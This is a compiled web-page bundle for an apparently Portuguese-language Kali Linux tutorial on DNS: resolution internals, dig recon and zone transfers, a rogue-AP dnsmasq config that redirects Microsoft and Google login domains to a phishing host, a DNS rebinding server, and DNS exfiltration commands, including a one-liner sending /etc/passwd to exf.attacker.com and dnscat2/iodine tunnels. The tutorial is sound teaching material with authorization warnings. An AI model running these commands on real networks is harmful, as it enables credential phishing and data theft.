import{j as e}from"./index-BofgBnE-.js";import{P as t}from"./PageContainer-B5fVeNJT.js";import{A as s}from"./AlertBox-B_JSQKUS.js";import{C as a}from"./CodeBlock-CaRmq6e3.js";import{C as r}from"./CommandTable-Ck2MUBHP.js";import{T as o,P as n}from"./PracticeBox-BgVTSfiK.js";function p(){return e.jsxs(t,{title:"DNS no Kali — resolver, dnsmasq, exfil e rebinding",subtitle:"DNS é a infraestrutura mais negligenciada e mais explorável da rede. Quem entende o stack de resolução vê covert channels onde o resto vê 'só consulta'.",difficulty:"intermediario",timeToRead:"24 min",children:[e.jsx("h2",{children:"O caminho de uma resolução"}),e.jsxs("p",{children:["Quando um processo no Kali pede ",e.jsx("code",{children:"kali.org"}),", o glibc consulta NSSwitch (",e.jsx("code",{children:"/etc/nsswitch.conf"}),") que diz a ordem: arquivos ","->"," DNS. Em",e.jsx("em",{children:"arquivos"})," ele lê ",e.jsx("code",{children:"/etc/hosts"}),". Em ",e.jsx("em",{children:"DNS"})," ele consulta os servidores listados em ",e.jsx("code",{children:"/etc/resolv.conf"})," — que hoje, na maioria dos sistemas, é um symlink para um stub local (",e.jsx("code",{children:"systemd-resolved"})," ou",e.jsx("code",{children:"NetworkManager + dnsmasq"}),")."]}),e.jsx(o,{path:"~",lines:[{cmd:"cat /etc/nsswitch.conf | grep ^hosts",out:"hosts:          files mdns4_minimal [NOTFOUND=return] dns",outType:"info"},{cmd:"ls -l /etc/resolv.conf",out:"lrwxrwxrwx 1 root root 39 Apr  3 09:01 /etc/resolv.conf -> ../run/systemd/resolve/stub-resolv.conf",outType:"default"},{cmd:"cat /etc/resolv.conf",out:`# This file is managed by man:systemd-resolved(8). Do not edit.
nameserver 127.0.0.53
options edns0 trust-ad
search lab.local`,outType:"muted"}]}),e.jsx(s,{type:"warning",title:"127.0.0.53 não é o servidor DNS real",children:e.jsxs("p",{children:["Esse ",e.jsx("code",{children:"127.0.0.53"})," é o stub do ",e.jsx("code",{children:"systemd-resolved"}),". Ele recebe sua query e encaminha para os DNS de fato configurados via DHCP/NM. Pra ver os ",e.jsx("em",{children:"upstream"})," reais use ",e.jsx("code",{children:"resolvectl status"}),"."]})}),e.jsx("h2",{children:"systemd-resolved"}),e.jsx(o,{path:"~",lines:[{cmd:"resolvectl status",out:`Global
       Protocols: -LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported
resolv.conf mode: stub
Current DNS Server: 192.168.56.1
       DNS Servers: 192.168.56.1 1.1.1.1
        DNS Domain: lab.local

Link 2 (eth0)
Current Scopes: DNS
     Protocols: +DefaultRoute +LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported
   DNS Servers: 192.168.56.1 1.1.1.1
    DNS Domain: lab.local`,outType:"info"},{comment:"forçar um DNS específico só na eth0",cmd:"sudo resolvectl dns eth0 9.9.9.9",out:"(silencioso — sobrescreve até o próximo evento DHCP/NM)",outType:"muted"},{comment:"limpar cache (útil quando target trocou IP via fast-flux)",cmd:"sudo resolvectl flush-caches",out:"(silencioso)",outType:"muted"},{comment:"ver estatísticas do cache",cmd:"resolvectl statistics",out:`DNSSEC supported by current servers: no

Transactions
Current Transactions: 0
  Total Transactions: 1247

Cache
  Current Cache Size: 38
          Cache Hits: 412
        Cache Misses: 835`,outType:"default"}]}),e.jsx("h2",{children:"/etc/hosts — o atalho mais barato"}),e.jsxs("p",{children:["Override local de qualquer hostname. Em pentest é recurso diário: mapear",e.jsx("code",{children:"10.10.11.42 dc01.htb.lab"})," e parar de digitar IP."]}),e.jsx(a,{language:"bash",title:"/etc/hosts (típico de engagement)",code:`127.0.0.1       localhost
127.0.1.1       kali

# === HTB box atual ===
10.10.11.42     dc01.sequel.htb sequel.htb
10.10.11.42     mssql.sequel.htb

# === cliente x — externo ===
203.0.113.10    portal.cliente-x.com
203.0.113.11    api.cliente-x.com

# IPv6
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters`}),e.jsx(o,{path:"~",lines:[{comment:"veja quem ganha — files vem ANTES de DNS no nsswitch",cmd:"getent hosts dc01.sequel.htb",out:"10.10.11.42     dc01.sequel.htb sequel.htb",outType:"success"}]}),e.jsx("h2",{children:"dig, host, nslookup — escolha o seu"}),e.jsxs("p",{children:["Pra recon DNS sério, ",e.jsx("code",{children:"dig"})," manda. ",e.jsx("code",{children:"host"})," é mais legível para humano, ",e.jsx("code",{children:"nslookup"})," existe pra você não esquecer como funciona no Windows."]}),e.jsx(r,{title:"dig — modos de uso ofensivos",variations:[{cmd:"dig kali.org",desc:"Resolução padrão (registro A).",output:"kali.org. 300 IN A 192.124.249.10"},{cmd:"dig +short kali.org",desc:"Só a resposta — perfeito pra script.",output:"192.124.249.10"},{cmd:"dig kali.org MX",desc:"Servidores de email — alvo de phishing.",output:"kali.org. 300 IN MX 10 mail.kali.org."},{cmd:"dig kali.org TXT",desc:"SPF, DKIM, DMARC, verificações de propriedade (Google, MS, ACME).",output:'kali.org. IN TXT "v=spf1 include:_spf.kali.org ~all"'},{cmd:"dig kali.org NS",desc:"Nameservers autoritativos (target pra tentar AXFR).",output:`kali.org. IN NS ns1.kali.org.
kali.org. IN NS ns2.kali.org.`},{cmd:"dig @8.8.8.8 kali.org",desc:"Consulta direto a um servidor (bypass do resolvedor local).",output:"Útil pra contornar DNS poisoning local."},{cmd:"dig +trace kali.org",desc:"Traça da raiz (.) ate autoritativos — mostra delegação.",output:". → org. → kali.org."},{cmd:"dig -x 8.8.8.8",desc:"Reverse DNS (PTR).",output:"8.8.8.8.in-addr.arpa. IN PTR dns.google."},{cmd:"dig AXFR @ns1.zonetransfer.me zonetransfer.me",desc:"Tentativa de zone transfer (mal configurado = jackpot de subdomínios).",output:";; XFR size: 47 records"},{cmd:"dig kali.org ANY +noall +answer",desc:"Pede todos os tipos (provider moderno costuma negar).",output:"RFC8482: NOTIMP em maioria dos providers grandes."}]}),e.jsx(o,{path:"~",lines:[{comment:"AXFR no famoso laboratório de teste",cmd:"dig AXFR @nsztm1.digi.ninja zonetransfer.me",out:`; <<>> DiG 9.20.5-1-Debian <<>> AXFR @nsztm1.digi.ninja zonetransfer.me
; (1 server found)
;; global options: +cmd
zonetransfer.me.        7200    IN      SOA     nsztm1.digi.ninja. robin.digi.ninja. ...
zonetransfer.me.        300     IN      HINFO   "Casio fx-700G" "Windows XP"
zonetransfer.me.        301     IN      TXT     "google-site-verification=tyP28J7..."
zonetransfer.me.        7200    IN      MX      0 ASPMX.L.GOOGLE.COM.
asfdbauthdns.zonetransfer.me. 7900 IN AFSDB 1 asfdbbox.zonetransfer.me.
canberra-office.zonetransfer.me. 7200 IN A 202.14.81.230
dc-office.zonetransfer.me. 7200 IN A 143.228.181.132
deadbeef.zonetransfer.me. 7201 IN AAAA dead:beaf::
dr.zonetransfer.me. 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m 1m 10000m 10m
;; XFR size: 50 records (messages 1, bytes 1994)`,outType:"warning"}]}),e.jsx("h2",{children:"dnsmasq — DNS + DHCP local em pentest"}),e.jsxs("p",{children:["Em ataques MITM/AP-pirata você precisa entregar IP e responder DNS.",e.jsx("code",{children:"dnsmasq"})," faz os dois com 20 linhas de config."]}),e.jsx(a,{language:"ini",title:"/etc/dnsmasq.d/rogueap.conf",code:`# Interface onde estamos servindo (ex: at0 do airbase, wlan0mon, etc.)
interface=wlan0
bind-interfaces

# DHCP: range, lease 12h, gateway nós
dhcp-range=10.0.0.50,10.0.0.150,12h
dhcp-option=3,10.0.0.1        # gateway
dhcp-option=6,10.0.0.1        # DNS aponta pra mim mesmo

# DNS: resolva tudo localmente apontando pro phishing
address=/login.microsoft.com/10.0.0.1
address=/accounts.google.com/10.0.0.1
address=/portal.cliente.com/10.0.0.1
# resto do mundo: encaminha pra Cloudflare
server=1.1.1.1

# Log de toda query (ouro pra OSINT do que a vítima visita)
log-queries
log-facility=/var/log/dnsmasq-rogue.log`}),e.jsx(o,{path:"~",lines:[{cmd:"sudo systemctl stop systemd-resolved   # libera a porta 53",out:"(silencioso)",outType:"muted"},{cmd:"sudo dnsmasq --no-daemon --conf-file=/etc/dnsmasq.d/rogueap.conf",out:`dnsmasq: started, version 2.90 cachesize 150
dnsmasq-dhcp: DHCP, IP range 10.0.0.50 -- 10.0.0.150, lease time 12h
dnsmasq: using nameserver 1.1.1.1#53
dnsmasq: read /etc/hosts - 5 names
dnsmasq-dhcp: DHCPDISCOVER(wlan0) aa:bb:cc:11:22:33
dnsmasq-dhcp: DHCPOFFER(wlan0) 10.0.0.51 aa:bb:cc:11:22:33
dnsmasq: query[A] login.microsoft.com from 10.0.0.51
dnsmasq: config login.microsoft.com is 10.0.0.1`,outType:"info"}]}),e.jsx(s,{type:"danger",title:"Só com autorização escrita",children:e.jsx("p",{children:"Rodar AP rogue com DNS hijack em rede pública (café, aeroporto) é crime na maioria dos países. Use só em range autorizado de pentest, ou em lab fechado."})}),e.jsx("h2",{children:"DNS rebinding — conceito"}),e.jsxs("p",{children:["DNS rebinding é uma classe de ataque onde um domínio que você controla resolve primeiro pro IP do seu servidor (TTL curto), o navegador da vítima carrega seu JS, e na ",e.jsx("em",{children:"segunda"})," resolução o mesmo domínio devolve um IP interno (",e.jsx("code",{children:"192.168.1.1"}),", ",e.jsx("code",{children:"127.0.0.1"}),"). O JS então fala com o roteador/serviço local mas ",e.jsx("em",{children:"parece"})," mesma origem para o navegador."]}),e.jsx(a,{language:"python",title:"rebind.py — servidor mínimo (didático)",code:`#!/usr/bin/env python3
"""
Servidor DNS authoritative simples que devolve dois IPs alternados
para um mesmo nome com TTL=1. Demonstrativo APENAS.
"""
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, A, QTYPE
import itertools

ips = itertools.cycle(["198.51.100.10", "192.168.1.1"])

class Rebinder(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        ip = next(ips)
        print(f"[+] {request.q.qname} -> {ip}")
        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip), ttl=1))
        return reply

if __name__ == "__main__":
    server = DNSServer(Rebinder(), port=53, address="0.0.0.0")
    server.start()`}),e.jsx(o,{path:"~",lines:[{cmd:"sudo python3 rebind.py &",out:"[1] 8421",outType:"muted"},{cmd:"dig @127.0.0.1 alvo.attacker.com +short",out:"198.51.100.10",outType:"info"},{cmd:"sleep 2 && dig @127.0.0.1 alvo.attacker.com +short",out:"192.168.1.1",outType:"warning"}]}),e.jsx(s,{type:"info",title:"Ferramenta pronta: rbndr / Singularity of Origin",children:e.jsxs("p",{children:["Em campo, ninguém escreve servidor DNS do zero. Use"," ",e.jsx("strong",{children:"Singularity of Origin"})," (NCC Group) que já vem com payloads de scan e exfil. Provê DNS, HTTP e a UI de ataque."]})}),e.jsx("h2",{children:"DNS exfiltration — conceito"}),e.jsxs("p",{children:["Em ambientes onde HTTP/HTTPS sai filtrado mas DNS não (clássico em rede corporativa fechada), o atacante exfiltra dados via subdomínios. Cada query",e.jsx("code",{children:"<base64chunk>.exfil.attacker.com"})," chega no DNS authoritative do atacante, que loga e remonta o arquivo."]}),e.jsx(o,{path:"~",lines:[{comment:"exfil bash puro: cada palavra do /etc/passwd vira subdominio",cmd:'while read line; do dig "$(echo $line | base64 -w0).exf.attacker.com" +short >/dev/null; done < /etc/passwd',out:"(no host atacante: dnsmasq --log-queries grava todas as labels — cole, decode b64, recupere o arquivo)",outType:"warning"},{comment:"ferramenta dedicada: dnscat2 (PowerShell client + ruby server)",cmd:"ruby ./dnscat2.rb attacker.com   # no atacante",out:`Starting Dnscat2 DNS server on 0.0.0.0:53
[for domains: attacker.com]
[+] New session 1 from beacon`,outType:"info"},{cmd:"iodine -f -P senha123 t.attacker.com   # túnel IP-sobre-DNS no client",out:`Sending DNS queries for t.attacker.com to 192.168.1.1
Server tunnel IP is 10.0.0.1
Connection setup complete, transmitting data.`,outType:"default"}]}),e.jsx("h2",{children:"DoH / DoT — DNS criptografado"}),e.jsxs("p",{children:["Em rede defensiva moderna, é comum forçar DNS via TLS (",e.jsx("code",{children:"853/tcp"}),") ou HTTPS (DoH em ",e.jsx("code",{children:"443/tcp"}),"). Como pentester você precisa saber: isso atrapalha sniff passivo, mas ",e.jsx("em",{children:"não impede"})," que VOCÊ use DoH para sair de um ambiente que filtra DNS clássico."]}),e.jsx(r,{title:"Resolver DoH/DoT — clientes utilitários",variations:[{cmd:"kdig @1.1.1.1 +tls -p 853 kali.org",desc:"DNS-over-TLS (RFC 7858) com kdig (knot-dnsutils).",output:"(igual ao dig, mas criptografado e nao snifavel via tcpdump padrão)"},{cmd:"curl -H 'accept: application/dns-json' 'https://1.1.1.1/dns-query?name=kali.org&type=A'",desc:"DoH JSON via HTTPS — sai mesmo onde só 443 passa.",output:'{"Status":0,"TC":false,"RD":true,"RA":true,"Answer":[{"name":"kali.org","type":1,"TTL":300,"data":"192.124.249.10"}]}'},{cmd:"cloudflared proxy-dns --port 5053 --upstream https://1.1.1.1/dns-query",desc:"Sobe um proxy DoH local — você usa 127.0.0.1:5053 como DNS clássico.",output:"(útil para reaproveitar tools que só falam plain DNS)"}]}),e.jsx("h2",{children:"Recon de subdomínios"}),e.jsx(r,{title:"Enumeração ofensiva de DNS",variations:[{cmd:"dnsrecon -d alvo.com -t std",desc:"Std: SOA, NS, A, MX, TXT + tentativa de AXFR.",output:"[*] Performing General Enumeration of Domain: alvo.com"},{cmd:"dnsenum --enum alvo.com",desc:"AXFR + bruteforce + Google scraping.",output:"Brute forcing with /usr/share/dnsenum/dns.txt:"},{cmd:"fierce --domain alvo.com",desc:"Foco em wildcards e zonas internas vazadas.",output:"Found: dc.alvo.com (10.0.0.10)"},{cmd:"amass enum -passive -d alvo.com",desc:"Passivo: cert transparency, search engines, NO query direta no alvo.",output:`api.alvo.com
mail.alvo.com
test.alvo.com
staging.alvo.com`},{cmd:"subfinder -d alvo.com -silent",desc:"Rápido, agrega ~30 fontes passivas.",output:"(uma linha por subdomínio achado)"},{cmd:"dnsx -l subs.txt -resp -a",desc:"Pega subs do subfinder e RESOLVE — descarta lixo.",output:`api.alvo.com [203.0.113.10]
mail.alvo.com [NXDOMAIN]`}]}),e.jsx(n,{title:"Recon DNS completo de um domínio + descoberta de subdomain takeover",goal:"Sair do nada e chegar numa lista resolvida de subs ativos, separando os que apontam pra serviços externos quebrados (candidatos a takeover).",steps:["Use subfinder em modo passivo no domínio target.","Resolva tudo com dnsx mantendo só o que tem A record.","Extraia CNAMEs com dig e procure apontamentos órfãos (Heroku, S3, Azure, GitHub Pages).","Marque manualmente os candidatos a subdomain takeover."],command:`# 1. coleta passiva
subfinder -d zonetransfer.me -silent -o subs.txt
wc -l subs.txt

# 2. valida resolução
dnsx -l subs.txt -a -resp -silent | tee resolved.txt

# 3. extrai CNAMEs
for sub in $(cat subs.txt); do
  cname=$(dig +short CNAME "$sub")
  [ -n "$cname" ] && echo "$sub -> $cname"
done | tee cnames.txt

# 4. takeover scan automatizado
nuclei -l subs.txt -t http/takeovers/ -silent`,expected:`50 subs.txt
office.zonetransfer.me [4.23.39.254]
dc-office.zonetransfer.me [143.228.181.132]
asfdbauthdns.zonetransfer.me -> asfdbbox.zonetransfer.me.

[subdomain-takeover-detection] [http] [high] http://test.zonetransfer.me`,verify:"Se você ver um CNAME apontando para um host de provider externo (heroku, github.io, s3) que retorna 404/NoSuchBucket, é candidato direto a subdomain takeover."}),e.jsx(s,{type:"info",title:"Cache poisoning local — onde fica",children:e.jsxs("p",{children:["O cache do ",e.jsx("code",{children:"systemd-resolved"})," vive em RAM (não há arquivo). Já o do ",e.jsx("code",{children:"nscd"})," (raro hoje) fica em ",e.jsx("code",{children:"/var/db/nscd/hosts"}),". Quando você quer garantir consulta limpa, sempre ",e.jsx("code",{children:"resolvectl flush-caches"}),"OU ",e.jsx("code",{children:"dig +nocache"}),"."]})})]})}export{p as default};
